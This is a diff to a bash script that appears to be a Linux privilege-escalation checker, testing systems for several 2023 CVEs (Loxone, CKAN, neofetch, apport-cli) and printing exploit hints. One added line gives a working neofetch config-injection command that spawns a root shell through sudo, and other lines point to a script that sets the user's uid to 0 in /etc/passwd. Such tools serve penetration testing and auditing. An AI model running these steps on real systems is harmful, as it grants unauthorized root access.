@@ -60,7 +60,8 @@ compare_versions() {
 # CVE-2023-36624 - Loxone Miniserver Go Gen.2 
 
 check1=$(echo "$cmd" 2>/dev/null | grep -i "starthomekit.service")
-check2=$(echo "$cmd" 2>/dev/null | grep -i "miniserverinit applytzdata")
+#check2=$(echo "$cmd" 2>/dev/null | grep -i "miniserverinit applytzdata")
+check2=$(echo "$cmd" 2>/dev/null | grep -i "miniserverinit")
 check3=$(echo "$cmd" 2>/dev/null | grep -i "$(which tar) \*")
 
 if [ -n "$check1" ] && [ -n "$check2" ] && [ -n "$check3" ]; then
@@ -79,7 +80,7 @@ fi
 # CVE-2023-32696 - CKAN
 
 check1=$(cat /etc/passwd | cut -d ":" -f 1 | grep -iw "ckan")
-check2=$(groups ckan | grep -i sudo)
+check2=$(groups ckan 2>/dev/null | grep -i sudo)
 check3=$(ls -al /srv/app/start_ckan_development.sh 2>/dev/null)
 
 if [ -n "$check1" ] && [ -n "$check2" ] && [ -n "$check3" ]; then
@@ -117,10 +118,10 @@ if [ -n "$check1" ] && [ -n "$check2" ] && [ -n "$check3" ]; then
     echo -e "[*] Notes: CVE/3rdPartyApps/CVE-2023-30630.txt"
     echo -e "${BOLD}${RED}[-] IMPORTANT: This vulnerability overwrite existing file, issue might occur on production system. A backup should be done prior to exploitation.${RESET}"
     echo -e "[-] For privilege escalation, the steps below can followed to limit the risk. The exploit will set the current user uid to 0 on /etc/passwd"
-    echo -e "[*] Exploit: CVE/3rdPartyApps/CVE-2023-32696/exploit.sh"
+    echo -e "[*] Exploit: CVE/3rdPartyApps/CVE-2023-32696/exploit-SK.sh"
     echo -e "[*] After successfully running the script, you may need to log again with the current user depending on OS flavor/version, you should have uid=0 when you run command id"
     echo -e "[-] The /etc/passwd backup is stored here : CVE/3rdPartyApps/CVE-2023-32696/passwd.backup"
-    echo -e "[*] Exploit: CVE/3rdPartyApps/CVE-2023-32696/restore.sh"
+    echo -e "[*] Restore (after PE when root): CVE/3rdPartyApps/CVE-2023-32696/restore.sh"
     echo -e "\n"
 
 fi
@@ -186,8 +187,9 @@ if [ -n "$check1" ] && [ -n "$check2" ] && [ -n "$check3" ]; then
    cmdneo=`echo "$cmd" 2>/dev/null | grep "neofetch \\\"\\\"" | cut -d: -f 2- | sed 's/^ //g'`
    echo -e "${BOLD}${RED}[-] neofetch sudo's rule is vulnerable ${RESET}"
    echo -e "${BOLD}${GREEN}[-] neofetch is vulnerable to command injection in config file${RESET}"
-    echo -e "[-] $(echo $check3 | sed 's/^ //g')"
-   echo -e "[*] Exploit: export XDG_CONFIG_HOME=$check2; echo 'exec /bin/bash' >> $check2; sudo $cmdneo \n"
+   echo -e "[-] $(echo $check3 | sed 's/^ //g')"
+   #echo -e "[*] Exploit: export XDG_CONFIG_HOME=$check2; echo 'exec /bin/bash' >> $check2; sudo $cmdneo \n"
+   echo -e "[*] Exploit: mkdir -p /tmp/cnf/neofetch;export XDG_CONFIG_HOME=/tmp/cnf; echo 'exec /bin/bash' >> /tmp/cnf/neofetch/config.conf; sudo $cmdneo; rm /tmp/cnf/neofetch/config.conf \n"
 fi
 
 # CVE-2023-1326 - apport-cli
